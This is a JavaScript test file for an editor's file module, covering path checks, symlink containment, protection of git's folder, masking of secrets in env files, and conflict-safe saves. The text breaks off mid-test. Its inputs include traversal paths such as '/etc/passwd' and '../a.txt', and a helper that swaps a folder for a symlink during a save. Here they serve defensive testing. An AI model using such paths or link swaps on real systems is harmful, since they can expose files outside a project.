import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import crypto from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { listFiles, readFile, writeFile, changedLines, checkPath, isSaveFile, MAX_FILE_BYTES } from '../src/core/files.mjs';

// Keep the person's own git settings, name and email out of these repositories, and their home folder out of these
// tests.
const ENV_KEYS = ['GIT_CONFIG_GLOBAL', 'GIT_CONFIG_NOSYSTEM', 'GIT_AUTHOR_NAME', 'GIT_AUTHOR_EMAIL', 'GIT_COMMITTER_NAME',
  'GIT_COMMITTER_EMAIL', 'GIT_CEILING_DIRECTORIES', 'HOME', 'XDG_CONFIG_HOME', 'PATH'];
const savedEnv = Object.fromEntries(ENV_KEYS.map(k => [k, process.env[k]]));

let T, outside;
let made = 0;

const git = (cwd, ...args) => execFileSync('git', args, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
const sha = bytes => crypto.createHash('sha256').update(bytes).digest('hex');
const bytesOf = (root, rel) => fs.readFileSync(path.join(root, rel));
const leftovers = dir => fs.readdirSync(dir).filter(n => n.includes('.workbench-save-'));

/** fs's and process's own functions, for the tests' own steps while some of them are mocked. */
const REAL = {
  renameSync: fs.renameSync, symlinkSync: fs.symlinkSync, unlinkSync: fs.unlinkSync, lstatSync: fs.lstatSync,
  openSync: fs.openSync, fsyncSync: fs.fsyncSync, chdir: process.chdir.bind(process),
};

/**
 * Swaps the folder `rel` of `root` for a link to `elsewhere` (the folder itself goes to `<rel>.real`), and back, as an
 * agent racing a save could. Uses fs's own functions, never the mocked ones.
 */
function swapper(root, rel, elsewhere) {
  const at = path.join(root, rel);
  let swapped = false;
  return {
    toLink() {
      REAL.renameSync(at, `${at}.real`);
      REAL.symlinkSync(elsewhere, at);
      swapped = true;
    },
    back() {
      if (!swapped) return;
      REAL.unlinkSync(at);
      REAL.renameSync(`${at}.real`, at);
      swapped = false;
    },
  };
}

/** A new repository holding `files` ({ path: text or bytes }) in its first commit: { root, since }. */
function repo(files = {}) {
  const root = path.join(T, `repo-${++made}`);
  fs.mkdirSync(root);
  git(root, 'init', '-q', '-b', 'main');
  put(root, files);
  git(root, 'add', '-A');
  git(root, 'commit', '-q', '--allow-empty', '-m', 'first');
  return { root, since: git(root, 'rev-parse', 'HEAD') };
}

function put(root, files) {
  for (const [rel, body] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(root, rel)), { recursive: true });
    fs.writeFileSync(path.join(root, rel), body);
  }
}

/** A key-shaped value made at run time, so no fixture looks like a real key. */
const fakeKey = (prefix) => [prefix, crypto.randomBytes(18).toString('hex')].join('');
/** The first ('BEGIN') or last ('END') line of a private key, made from parts for the same reason. */
const keyMark = (word) => ['-----', word, ' PRIVATE', ' KEY', '-----'].join('');

/** Words of git's or Node's own: never in a sentence a person reads. */
function plainWords(sentence) {
  assert.doesNotMatch(sentence, /\bE[A-Z]{3,}\b/, sentence);
  assert.doesNotMatch(sentence, /fatal:|error:|errno|syscall|Command failed|undefined|\[object/i, sentence);
  assert.match(sentence, /[.]$/, sentence);
}

/** `p` is refused with a plain sentence matching `words`. */
async function refused(p, words) {
  await assert.rejects(p, e => {
    assert.equal(e.plain, true, `not a plain error: ${e.message}`);
    assert.equal(e.why, 'refused', e.message);
    assert.match(e.message, words);
    plainWords(e.message);
    return true;
  });
}

before(() => {
  process.env.GIT_CONFIG_GLOBAL = '/dev/null';
  process.env.GIT_CONFIG_NOSYSTEM = '1';
  process.env.GIT_AUTHOR_NAME = process.env.GIT_COMMITTER_NAME = 'Workbench Test';
  process.env.GIT_AUTHOR_EMAIL = process.env.GIT_COMMITTER_EMAIL = 'test@example.invalid';
  T = fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), 'wb-files-')));
  process.env.GIT_CEILING_DIRECTORIES = T; // a folder here that is not a repository is never taken for part of one above it
  for (const [key, dir] of [['HOME', 'home'], ['XDG_CONFIG_HOME', 'xdg']]) {
    fs.mkdirSync(path.join(T, dir));
    process.env[key] = path.join(T, dir);
  }
  outside = path.join(T, 'outside');
  fs.mkdirSync(outside);
  fs.writeFileSync(path.join(outside, 'private.txt'), 'outside the project\n');
});

after(() => {
  for (const [k, v] of Object.entries(savedEnv)) {
    if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }
  fs.rmSync(T, { recursive: true, force: true });
});

// ------------------------------------------------------------------ path rules

test('path rules: a file is named from the top folder, with forward slashes, and nothing that climbs out', async () => {
  for (const ok of ['a.txt', 'src/b.js', 'a folder/with spaces.md', '.gitignore', '.github/workflows/ci.yml', 'x.git/y',
    'back\\slash.txt', 'ü/名前.txt', 'a'.repeat(4096)]) {
    assert.deepEqual(checkPath(ok), ok.split('/'), ok);
  }
  const { root } = repo({ 'a.txt': 'a\n' });
  const bad = ['', '/etc/passwd', '/a.txt', 'a//b', 'src/', './a.txt', 'a/./b', '..', '../a.txt', 'src/../../a.txt',
    'a\0b', 'é'.repeat(2049)];
  for (const rel of bad) {
    assert.throws(() => checkPath(rel), e => e.plain === true && e.why === 'refused', JSON.stringify(rel));
    await refused(readFile({ root, rel }), /./);
    await refused(writeFile({ root, rel, text: 'x', hash: sha('a\n') }), /./);
    await refused(changedLines({ root, rel, since: 'a'.repeat(40) }), /./);
  }
  for (const rel of [undefined, null, 42, ['a.txt'], { toString: () => 'a.txt' }]) {
    assert.throws(() => checkPath(rel), e => e.plain === true && /No file was named/.test(e.message));
  }
  await refused(readFile({ root, rel: '../a.txt' }), /is not the name of a file inside the project/);
  await refused(readFile({ root, rel: 'é'.repeat(2049) }), /longer than 4096 bytes/);
  await refused(readFile({ root: path.join(T, 'no-such-folder'), rel: 'a.txt' }), /does not exist/);
});

test('git’s own folder is left alone, whatever case or link leads there', async () => {
  const { root } = repo({ 'a.txt': 'a\n' });
  for (const rel of ['.git', '.git/config', '.GIT/config', 'sub/.Git/HEAD', '.git‌/config', '﻿.git/HEAD']) {
    assert.throws(() => checkPath(rel), e => e.plain && /git’s own folder/.test(e.message), JSON.stringify(rel));
    await refused(readFile({ root, rel }), /git’s own folder/);
  }
  const config = fs.readFileSync(path.join(root, '.git', 'config'));
  // A folder link inside the project that points into .git: the real path is what counts.
  fs.symlinkSync('.git', path.join(root, 'gitdir'));
  await refused(readFile({ root, rel: 'gitdir/config' }), /git’s own folder/);
  await refused(writeFile({ root, rel: 'gitdir/config', text: 'x\n', hash: sha(config) }), /git’s own folder/);
  assert.deepEqual(fs.readFileSync(path.join(root, '.git', 'config')), config);
  // The same folder by another case, where the file system ignores case (as a Mac's does).
  const caseless = fs.existsSync(path.join(root, '.GIT'));
  if (caseless) {
    fs.symlinkSync('.GIT', path.join(root, 'shouty'));
    await refused(readFile({ root, rel: 'shouty/config' }), /git’s own folder/);
  }
  // A link to a file in .git is shown as a link, never followed.
  fs.symlinkSync('.git/config', path.join(root, 'cfg'));
  const link = await readFile({ root, rel: 'cfg' });
  assert.equal(link.kind, 'link');
  assert.equal(link.link, '.git/config');
  assert.equal(link.text, undefined);
});

test('links: a link is shown as a link, a folder link inside the project is followed, and nothing leads outside', async () => {
  const { root } = repo({ 'src/b.js': 'let b = 1;\n', 'a.txt': 'a\n' });
  fs.symlinkSync('src/b.js', path.join(root, 'inside.js'));
  fs.symlinkSync(path.join(outside, 'private.txt'), path.join(root, 'out.txt'));
  fs.symlinkSync('src', path.join(root, 'lib'));
  fs.symlinkSync(outside, path.join(root, 'ext'));

  const inside = await readFile({ root, rel: 'inside.js' });
  assert.deepEqual(inside, { kind: 'link', link: 'src/b.js', hash: sha('src/b.js'), size: 8, eol: 'none', bom: false });
  const out = await readFile({ root, rel: 'out.txt' });
  assert.equal(out.kind, 'link');
  assert.equal(out.link, path.join(outside, 'private.txt'));
  assert.equal(out.text, undefined);
  assert.doesNotMatch(JSON.stringify(out), /outside the project/);

  const through = await readFile({ root, rel: 'lib/b.js' });
  assert.equal(through.kind, 'text');
  assert.equal(through.text, 'let b = 1;\n');
  await refused(readFile({ root, rel: 'ext/private.txt' }), /^ext\/private\.txt leads outside the project folder, so Workbench does not open it\.$/);

  // Writes: never through a link at the end, never outside.
  await refused(writeFile({ root, rel: 'inside.js', text: 'changed\n', hash: sha('src/b.js') }), /is a link/);
  await refused(writeFile({ root, rel: 'out.txt', text: 'changed\n', hash: sha(path.join(outside, 'private.txt')) }), /is a link/);
  await refused(writeFile({ root, rel: 'ext/private.txt', text: 'changed\n', hash: sha('outside the project\n') }), /leads outside the project folder/);
  assert.equal(fs.readFileSync(path.join(outside, 'private.txt'), 'utf8'), 'outside the project\n');
  assert.equal(fs.readFileSync(path.join(root, 'src/b.js'), 'utf8'), 'let b = 1;\n');
  assert.equal(fs.readlinkSync(path.join(root, 'inside.js')), 'src/b.js');
  // Through a folder link inside the project, a save lands in the real folder, beside the real file.
  await writeFile({ root, rel: 'lib/b.js', text: 'let b = 2;\n', hash: sha('let b = 1;\n') });
  assert.equal(fs.readFileSync(path.join(root, 'src/b.js'), 'utf8'), 'let b = 2;\n');
  assert.equal(fs.lstatSync(path.join(root, 'lib')).isSymbolicLink(), true);
  assert.deepEqual([...leftovers(path.join(root, 'src')), ...leftovers(root)], []);
});

test('a folder, a FIFO and a missing file', async () => {
  const { root } = repo({ 'src/b.js': 'b\n' });
  await refused(readFile({ root, rel: 'src' }), /^src is a folder, not a file\.$/);
  await refused(writeFile({ root, rel: 'src', text: 'x', hash: sha('') }), /is a folder/);
  execFileSync('mkfifo', [path.join(root, 'pipe')]);
  await refused(readFile({ root, rel: 'pipe' }), /^pipe is not a regular file, so Workbench does not open it\.$/);
  await refused(writeFile({ root, rel: 'pipe', text: 'x', hash: sha('') }), /is not a regular file/);
  for (const rel of ['gone.txt', 'no-folder/gone.txt', 'src/b.js/inside-a-file']) {
    assert.deepEqual(await readFile({ root, rel }), { kind: 'missing', hash: null, size: 0, eol: 'none', bom: false }, rel);
  }
});

// ------------------------------------------------------------------ reading

test('text: the hash of the bytes on disk, the size, the lines, the line endings and the BOM', async () => {
  const bom = Buffer.from([0xef, 0xbb, 0xbf]);
  const files = {
    'lf.txt': 'one\ntwo\n',
    'crlf.txt': 'one\r\ntwo\r\n',
    'bom.txt': Buffer.concat([bom, Buffer.from('one\r\ntwo')]),
    'none.txt': 'just one line',
    'empty.txt': '',
    'mixed.txt': 'one\r\ntwo\n',
    'lone-cr.txt': 'one\rtwo\n',
    'old-mac.txt': 'one\rtwo\r',
    'cr-in-crlf.txt': 'one\r\r\ntwo\r\n',
    'unicode.txt': 'héllo → 世界 ‮\n',
  };
  const { root } = repo(files);
  const read = rel => readFile({ root, rel });
  const size = rel => Buffer.byteLength(files[rel]);
  assert.deepEqual(await read('lf.txt'), { kind: 'text', text: 'one\ntwo\n', hash: sha(files['lf.txt']), size: 8, lines: 2, eol: 'lf', bom: false });
  assert.deepEqual(await read('crlf.txt'), { kind: 'text', text: 'one\ntwo\n', hash: sha(files['crlf.txt']), size: 10, lines: 2, eol: 'crlf', bom: false });
  assert.deepEqual(await read('bom.txt'), { kind: 'text', text: 'one\ntwo', hash: sha(files['bom.txt']), size: 11, lines: 2, eol: 'crlf', bom: true });
  assert.deepEqual(await read('none.txt'), { kind: 'text', text: 'just one line', hash: sha(files['none.txt']), size: 13, lines: 1, eol: 'none', bom: false });
  assert.deepEqual(await read('empty.txt'), { kind: 'text', text: '', hash: sha(''), size: 0, lines: 0, eol: 'none', bom: false });
  // CRLF shows as LF; a carriage return on its own is a line ending Workbench never writes, so it counts as mixed.
  assert.deepEqual(await read('mixed.txt'), { kind: 'text', text: 'one\ntwo\n', hash: sha(files['mixed.txt']), size: size('mixed.txt'), lines: 2, eol: 'mixed', bom: false });
  assert.deepEqual(await read('lone-cr.txt'), { kind: 'text', text: 'one\rtwo\n', hash: sha(files['lone-cr.txt']), size: size('lone-cr.txt'), lines: 1, eol: 'mixed', bom: false });
  assert.equal((await read('old-mac.txt')).eol, 'mixed');
  assert.equal((await read('cr-in-crlf.txt')).eol, 'mixed');
  assert.equal((await read('cr-in-crlf.txt')).text, 'one\r\ntwo\n');
  const uni = await read('unicode.txt');
  assert.equal(uni.text, files['unicode.txt']);
  assert.equal(uni.size, size('unicode.txt'));
});

test('binary, large and not UTF-8 files are described, never shown or edited', async () => {
  const binary = Buffer.from([0x50, 0x4e, 0x47, 0x00, 0x01, 0x02]);
  const lateNul = Buffer.concat([Buffer.from('a'.repeat(9000)), Buffer.from([0]), Buffer.from('b\n')]);
  const large = Buffer.alloc(MAX_FILE_BYTES + 1, 0x61);
  const justFits = Buffer.alloc(MAX_FILE_BYTES, 0x61);
  const latin1 = Buffer.from([0x63, 0x61, 0x66, 0xe9, 0x0a]); // "café" in Latin-1
  const { root } = repo({ 'logo.png': binary, 'late.bin': lateNul, 'big.txt': large, 'fits.txt': justFits, 'latin1.txt': latin1 });
  assert.equal(MAX_FILE_BYTES, 1024 * 1024);
  assert.deepEqual(await readFile({ root, rel: 'logo.png' }), { kind: 'binary', hash: sha(binary), size: 6, eol: 'none', bom: false });
  // A NUL anywhere makes a file binary, so text Workbench shows or saves never holds one.
  assert.equal((await readFile({ root, rel: 'late.bin' })).kind, 'binary');
  assert.deepEqual(await readFile({ root, rel: 'big.txt' }), { kind: 'large', hash: null, size: MAX_FILE_BYTES + 1, eol: 'none', bom: false });
  const fits = await readFile({ root, rel: 'fits.txt' });
  assert.deepEqual([fits.kind, fits.size, fits.lines, fits.hash], ['text', MAX_FILE_BYTES, 1, sha(justFits)]);
  assert.deepEqual(await readFile({ root, rel: 'latin1.txt' }), { kind: 'notutf8', hash: sha(latin1), size: 5, eol: 'none', bom: false });

  await refused(writeFile({ root, rel: 'logo.png', text: 'x', hash: sha(binary) }), /^logo\.png is a binary file, so Workbench does not edit it\.$/);
  await refused(writeFile({ root, rel: 'big.txt', text: 'x', hash: sha(large) }), /^big\.txt is larger than 1 MB, so Workbench does not edit it\.$/);
  await refused(writeFile({ root, rel: 'latin1.txt', text: 'cafe\n', hash: sha(latin1) }), /^latin1\.txt is not UTF-8 text, so Workbench does not edit it\.$/);
  assert.deepEqual(bytesOf(root, 'logo.png'), binary);
  assert.deepEqual(bytesOf(root, 'latin1.txt'), latin1);
  assert.deepEqual(leftovers(root), []);
});

test('a file over the limit is known by its size: not a byte of it is read', async (t) => {
  const over = Buffer.alloc(MAX_FILE_BYTES + 1, 0x61);
  const { root } = repo({ 'a.txt': 'a\n' });
  fs.writeFileSync(path.join(root, 'big.log'), over);
  const reads = t.mock.method(fs, 'readSync');
  assert.deepEqual(await readFile({ root, rel: 'big.log' }), { kind: 'large', hash: null, size: MAX_FILE_BYTES + 1, eol: 'none', bom: false });
  await refused(writeFile({ root, rel: 'big.log', text: 'x', hash: sha(over) }), /larger than 1 MB/);
  assert.equal(reads.mock.callCount(), 0);
  await readFile({ root, rel: 'a.txt' });
  assert.ok(reads.mock.callCount() > 0, 'a file within the limit is read the same way');
});

test('env files show each value only as its last four characters, and are never edited', async () => {
  const stripe = fakeKey('sk_' + 'live_');
  const old = fakeKey('sk_' + 'test_');
  const password = fakeKey('pw');
  const body = [crypto.randomBytes(24).toString('base64'), crypto.randomBytes(24).toString('base64')];
  const stray = fakeKey('ghp_');
  const text = [
    '# Payments',
    `STRIPE_SECRET_KEY=${stripe}`,
    `export DATABASE_URL="postgres://app:${password}@db.internal/app" # the main one`,
    'PORT=3000',
    'EMPTY=',
    'QUOTED_EMPTY=""',
    `# OLD_KEY=${old}`,
    `NAME: ${password}`,
    `PRIVATE_KEY="${keyMark('BEGIN')}`,
    ...body,
    `${keyMark('END')}"`,
    `SINGLE='${old}'`,
    stray,
    '',
    '   ',
  ].join('\n') + '\n';
  const masked = [
    '# ••••',
    `STRIPE_SECRET_KEY=•••• ${stripe.slice(-4)}`,
    'export DATABASE_URL="•••• /app" ••••',
    'PORT=••••',
    'EMPTY=',
    'QUOTED_EMPTY=""',
    `# OLD_KEY=•••• ${old.slice(-4)}`,
    `NAME: •••• ${password.slice(-4)}`,
    'PRIVATE_KEY="••••',
    '••••',
    '••••',
    '••••"',
    `SINGLE='•••• ${old.slice(-4)}'`,
    '••••', // a line that names nothing may be part of a key: no last characters
    '',
    '   ',
  ].join('\n') + '\n';
  const crlf = text.replace(/\n/g, '\r\n');
  const { root } = repo({
    '.env': text, 'config/.env.local': crlf, 'prod.env': text, 'LOUD.ENV': text, '.envrc': text, 'tools/.EnvRC': text,
    'env.ts': 'export const env = 1;\n', '.envrc.md': 'notes\n',
  });
  // direnv's .envrc holds keys as `export NAME=value`, as env files do.
  for (const rel of ['.env', 'config/.env.local', 'prod.env', 'LOUD.ENV', '.envrc', 'tools/.EnvRC']) {
    const got = await readFile({ root, rel });
    assert.equal(got.kind, 'secret', rel);
    assert.equal(got.text, masked, rel);
    assert.equal(got.lines, text.split('\n').length - 1);
    for (const secret of [stripe, old, password, stray, ...body]) assert.equal(got.text.includes(secret), false, rel);
    assert.equal(got.hash, sha(rel === 'config/.env.local' ? crlf : text));
    await refused(writeFile({ root, rel, text: got.text, hash: got.hash }), /holds keys, so Workbench does not edit it/);
  }
  assert.equal((await readFile({ root, rel: 'config/.env.local' })).eol, 'crlf');
  assert.equal((await readFile({ root, rel: 'env.ts' })).kind, 'text');
  assert.equal((await readFile({ root, rel: '.envrc.md' })).kind, 'text');
  assert.equal(fs.readFileSync(path.join(root, '.env'), 'utf8'), text);
  // A value whose closing quote never comes: every line after it is masked.
  const { root: r2 } = repo({ '.env': `KEY="${stripe}\nA=1\n${old}\n` });
  assert.equal((await readFile({ root: r2, rel: '.env' })).text, 'KEY="••••\n••••\n••••\n');
});

test('in an env file, a key never passes for the name of a value', async () => {
  // Tokens that read as a name followed by "=" or ":": padded base64url, one commented out, an AWS key id (no lower
  // case), a base32 secret (upper case and digits), lower-case hex, one that starts with a digit, one longer than a
  // name, and the lines of a private key pasted without quotes, its last line padded.
  const token = `Qx7${crypto.randomBytes(32).toString('base64url')}`;
  const aws = ['AK', 'IA', crypto.randomBytes(8).toString('hex').toUpperCase()].join('');
  const base32 = ['JB', 'SW', 'Y3', 'DP', 'EH', 'PK', '3P', 'XP'].join('');
  const hex = `f${crypto.randomBytes(11).toString('hex')}7`;
  const digitFirst = `7_${'deadbeef'.repeat(2)}`;
  const tooLong = 'SECRET_'.repeat(10);
  // Each caught by one rule alone: an AWS key id of letters only (looksLikeSecret), and short base64url whose parts
  // are all short (the mix of upper case, lower case and digits).
  const awsLetters = ['AK', 'IA', Array.from(crypto.randomBytes(16), b => String.fromCharCode(65 + (b % 26))).join('')].join('');
  const shortToken = ['xY7kP2qR4s', 'T9uV1wX3yZ', '5aB'].join('-');
  const keyLines = [`Mx9${crypto.randomBytes(30).toString('base64url')}`, `Kp2${crypto.randomBytes(20).toString('base64url')}==`];
  const text = [
    `${token}=`,
    `${token}==`,
    `# ${token}: the old one`,
    `${aws}=`,
    `${awsLetters}=`,
    `${shortToken}=`,
    `${base32}=`,
    `${hex}==`,
    `${digitFirst}=`,
    `${tooLong}=`,
    `KEY=${keyMark('BEGIN')}`,
    ...keyLines,
    keyMark('END'),
    'REACT_APP_API_V2_URL=https://api.example.com/v2',
    'database_url=postgres://localhost/app',
    'apiKey=not-a-real-one-at-all',
    'K8S_NAMESPACE=default',
    'POSTGRES15_HOST=',
  ].join('\n') + '\n';
  const { root } = repo({ '.env': text });
  const got = await readFile({ root, rel: '.env' });
  assert.equal(got.text, [
    '••••',
    '••••',
    '# ••••',
    '••••',
    '••••',
    '••••',
    '••••',
    '••••',
    '••••',
    '••••',
    'KEY=•••• ----',
    '••••',
    '••••',
    '••••',
    'REACT_APP_API_V2_URL=•••• m/v2',
    'database_url=•••• /app',
    'apiKey=•••• -all',
    'K8S_NAMESPACE=••••',
    'POSTGRES15_HOST=',
  ].join('\n') + '\n');
  for (const secret of [token, aws, base32, hex, digitFirst, tooLong, awsLetters, shortToken, ...keyLines]) {
    assert.equal(got.text.includes(secret), false);
    assert.equal(got.text.includes(secret.slice(-4)), false, 'not even its last four characters');
  }
});

test('in an env file, a comment after a value is not part of it: the last four characters are the value’s', async () => {
  const key = fakeKey('sk_' + 'live_');
  const end = key.slice(-4);
  const text = [
    `API_KEY=${key} # rotated 2026`,
    `TOKEN=${key} #prod`,
    `INLINE=${key}\t# the prod key`,
    'EMPTY= # fill in later',
    `QUOTED="${key}" # rotated 2026`,
    `# OLD_KEY=${key} # the one before`,
    `HASHED=${key}#part-of-it`, // a "#" with no space before it is part of the value, as sh reads it
    'SHORT=#x',
    'export PORT=3000 # the default',
  ].join('\n') + '\n';
  const { root } = repo({ '.env': text });
  const got = await readFile({ root, rel: '.env' });
  assert.equal(got.text, [
    `API_KEY=•••• ${end} ••••`,
    `TOKEN=•••• ${end} ••••`,
    `INLINE=•••• ${end} ••••`,
    'EMPTY= ••••',
    `QUOTED="•••• ${end}" ••••`,
    `# OLD_KEY=•••• ${end} ••••`,
    'HASHED=•••• f-it',
    'SHORT=••••',
    'export PORT=•••• ••••',
  ].join('\n') + '\n');
  const comments = got.text.split(end).join(''); // the key's own last characters may be digits too
  for (const words of ['2026', 'prod', 'later', 'before', 'default']) assert.equal(comments.includes(words), false, words);
});

// ------------------------------------------------------------------ saving

test('a save keeps the line endings, the BOM and the final newline as the person left it', async () => {
  const bom = Buffer.from([0xef, 0xbb, 0xbf]);
  const { root } = repo({
    'lf.txt': 'one\ntwo\n', 'crlf.txt': 'one\r\ntwo\r\n', 'bom.txt': Buffer.concat([bom, Buffer.from('one\r\ntwo\r\n')]),
    'none.txt': 'single', 'empty.txt': '',
  });
  const save = async (rel, text) => {
    const now = await readFile({ root, rel });
    return writeFile({ root, rel, text, hash: now.hash });
  };
  let r = await save('lf.txt', 'one\nTWO\nthree');
  assert.equal(fs.readFileSync(path.join(root, 'lf.txt'), 'utf8'), 'one\nTWO\nthree');
  assert.deepEqual(r, { hash: sha('one\nTWO\nthree'), size: 13 });
  await save('lf.txt', 'one\nTWO\nthree\n');
  assert.equal(fs.readFileSync(path.join(root, 'lf.txt'), 'utf8'), 'one\nTWO\nthree\n');

  r = await save('crlf.txt', 'one\nTWO\nthree\n');
  assert.equal(fs.readFileSync(path.join(root, 'crlf.txt'), 'utf8'), 'one\r\nTWO\r\nthree\r\n');
  assert.deepEqual(r, { hash: sha('one\r\nTWO\r\nthree\r\n'), size: 17 });
  await save('crlf.txt', 'one\nno newline at the end');
  assert.equal(fs.readFileSync(path.join(root, 'crlf.txt'), 'utf8'), 'one\r\nno newline at the end');

  await save('bom.txt', 'uno\ndos\n');
  assert.deepEqual(bytesOf(root, 'bom.txt'), Buffer.concat([bom, Buffer.from('uno\r\ndos\r\n')]));
  const back = await readFile({ root, rel: 'bom.txt' });
  assert.deepEqual([back.text, back.bom, back.eol], ['uno\ndos\n', true, 'crlf']);

  // A file with no line break yet gets LF.
  await save('none.txt', 'single\nline\n');
  assert.equal(fs.readFileSync(path.join(root, 'none.txt'), 'utf8'), 'single\nline\n');
  await save('empty.txt', 'now with words');
  assert.equal(fs.readFileSync(path.join(root, 'empty.txt'), 'utf8'), 'now with words');
  assert.deepEqual(leftovers(root), []);
});

test('a save refuses mixed line endings, and text that holds a carriage return, a NUL or a broken character', async () => {
  const { root } = repo({ 'mixed.txt': 'one\r\ntwo\n', 'cr.txt': 'one\rtwo\n', 'ok.txt': 'ok\n', 'crlf.txt': 'a\r\n' });
  for (const rel of ['mixed.txt', 'cr.txt']) {
    const before = bytesOf(root, rel);
    await refused(writeFile({ root, rel, text: 'one\ntwo\n', hash: sha(before) }), new RegExp(`^${rel.replace('.', '\\.')} mixes line endings, so Workbench does not edit it\\.$`));
    assert.deepEqual(bytesOf(root, rel), before);
  }
  const hash = sha('ok\n');
  await refused(writeFile({ root, rel: 'ok.txt', text: 'a\r\nb\n', hash }), /carriage return/);
  await refused(writeFile({ root, rel: 'ok.txt', text: 'a\0b\n', hash }), /NUL character/);
  await refused(writeFile({ root, rel: 'ok.txt', text: 'broken \ud800 half\n', hash }), /cannot be written as UTF-8/);
  await refused(writeFile({ root, rel: 'ok.txt', text: 42, hash }), /no text to save/);
  await refused(writeFile({ root, rel: 'ok.txt', text: 'x\n' }), /which version of ok\.txt/);
  await refused(writeFile({ root, rel: 'ok.txt', text: 'x\n', hash: 'abc' }), /which version of ok\.txt/);
  // The limit counts the bytes written: here, LF becomes CRLF and passes 1 MB.
  const text = 'x\n'.repeat(500_000);
  assert.ok(Buffer.byteLength(text) <= MAX_FILE_BYTES);
  await refused(writeFile({ root, rel: 'crlf.txt', text, hash: sha('a\r\n') }), /^The edit would make crlf\.txt larger than 1 MB, so Workbench did not save it\.$/);
  assert.equal(fs.readFileSync(path.join(root, 'ok.txt'), 'utf8'), 'ok\n');
  assert.equal(fs.readFileSync(path.join(root, 'crlf.txt'), 'utf8'), 'a\r\n');
  assert.deepEqual(leftovers(root), []);
});

test('a save is refused when the file changed since it was read, and force needs the hash that refusal gave', async () => {
  const { root } = repo({ 'export.ts': 'export const a = 1;\n' });
  const shown = await readFile({ root, rel: 'export.ts' });
  fs.writeFileSync(path.join(root, 'export.ts'), 'export const a = 2; // the agent\n');
  const theirs = sha('export const a = 2; // the agent\n');

  let changed;
  await assert.rejects(writeFile({ root, rel: 'export.ts', text: 'export const a = 3;\n', hash: shown.hash }), e => {
    changed = e;
    return e.plain === true && e.why === 'changed' && e.hash === theirs;
  });
  assert.equal(changed.message, 'export.ts changed on disk since it was opened, so nothing was written.');
  plainWords(changed.message);
  assert.equal(fs.readFileSync(path.join(root, 'export.ts'), 'utf8'), 'export const a = 2; // the agent\n');

  // Save mine anyway: force, with the hash the refusal gave. The old hash is refused even with force.
  await assert.rejects(writeFile({ root, rel: 'export.ts', text: 'export const a = 3;\n', hash: shown.hash, force: true }),
    e => e.why === 'changed' && e.hash === theirs);
  const saved = await writeFile({ root, rel: 'export.ts', text: 'export const a = 3;\n', hash: changed.hash, force: true });
  assert.deepEqual(saved, { hash: sha('export const a = 3;\n'), size: 20 });
  assert.equal(fs.readFileSync(path.join(root, 'export.ts'), 'utf8'), 'export const a = 3;\n');

  // It changed again after the refusal: force with the hash it gave is refused too, with the newest hash.
  fs.writeFileSync(path.join(root, 'export.ts'), 'export const a = 4;\n');
  await assert.rejects(writeFile({ root, rel: 'export.ts', text: 'export const a = 5;\n', hash: saved.hash, force: true }), e => {
    plainWords(e.message);
    return e.why === 'changed' && e.hash === sha('export const a = 4;\n') && /changed again/.test(e.message);
  });
  assert.equal(fs.readFileSync(path.join(root, 'export.ts'), 'utf8'), 'export const a = 4;\n');
  assert.deepEqual(leftovers(root), []);
});

test('a save replaces the file in one step, keeping its mode', async (t) => {
  const was = process.umask(0o077); // a new file would be 0600: only an explicit mode makes it the original's
  t.after(() => process.umask(was));
  const { root } = repo({ 'shared.txt': 'one\n', 'run.sh': '#!/bin/sh\necho hi\n' });
  fs.chmodSync(path.join(root, 'shared.txt'), 0o664);
  fs.chmodSync(path.join(root, 'run.sh'), 0o750);
  for (const [rel, mode] of [['shared.txt', 0o664], ['run.sh', 0o750]]) {
    const before = fs.statSync(path.join(root, rel));
    const now = await readFile({ root, rel });
    await writeFile({ root, rel, text: `${now.text}more\n`, hash: now.hash });
    const after = fs.statSync(path.join(root, rel));
    assert.equal(after.mode & 0o7777, mode, rel);
    assert.notEqual(after.ino, before.ino, `${rel} was renamed into place, not written over`);
    assert.equal(fs.readFileSync(path.join(root, rel), 'utf8'), `${now.text}more\n`);
  }
  assert.deepEqual(leftovers(root), []);
});

test('a save never makes a file', async () => {
  const { root } = repo({ 'a.txt': 'a\n' });
  await refused(writeFile({ root, rel: 'new.txt', text: 'hello\n', hash: sha('') }), /^new\.txt is not there any more, and Workbench does not make new files\.$/);
  await refused(writeFile({ root, rel: 'new-folder/new.txt', text: 'hello\n', hash: sha('') }), /does not make new files/);
  assert.equal(fs.existsSync(path.join(root, 'new.txt')), false);
  assert.equal(fs.existsSync(path.join(root, 'new-folder')), false);
  assert.deepEqual(leftovers(root), []);
});

test('a read-only file is not saved over', { skip: process.getuid?.() === 0 && 'root may write anything' }, async () => {
  const { root } = repo({ 'locked.txt': 'locked\n' });
  fs.chmodSync(path.join(root, 'locked.txt'), 0o444);
  await refused(writeFile({ root, rel: 'locked.txt', text: 'open\n', hash: sha('locked\n') }), /^locked\.txt is read-only, so Workbench did not change it\.$/);
  assert.equal(fs.readFileSync(path.join(root, 'locked.txt'), 'utf8'), 'locked\n');
  assert.deepEqual(leftovers(root), []);
});

test('when a save fails, its temporary file beside the original is removed', async (t) => {
  const { root } = repo({ 'a.txt': 'one\n' });
  t.mock.method(fs, 'renameSync', () => {
    throw Object.assign(new Error('EIO: i/o error, rename'), { code: 'EIO' });
  });
  await refused(writeFile({ root, rel: 'a.txt', text: 'two\n', hash: sha('one\n') }), /^Workbench could not save a\.txt\.$/);
  assert.equal(fs.readFileSync(path.join(root, 'a.txt'), 'utf8'), 'one\n');
  assert.deepEqual(leftovers(root), []);
});

test('just before the rename, the file must still be a regular file holding what was edited', async (t) => {
  const { root } = repo({ 'a.txt': 'one\n', 'b.txt': 'one\n', 'c.txt': 'one\n' });
  const realFsync = fs.fsyncSync;
  const fsync = t.mock.method(fs, 'fsyncSync');
  // An agent writes the file while the person's text is being saved: its write is kept.
  fsync.mock.mockImplementationOnce((fd) => {
    realFsync(fd);
    fs.writeFileSync(path.join(root, 'a.txt'), 'the agent\n');
  });
  await assert.rejects(writeFile({ root, rel: 'a.txt', text: 'the person\n', hash: sha('one\n') }), e => {
    assert.equal(e.message, 'a.txt changed on disk since it was opened, so nothing was written.');
    return e.plain === true && e.why === 'changed' && e.hash === sha('the agent\n');
  });
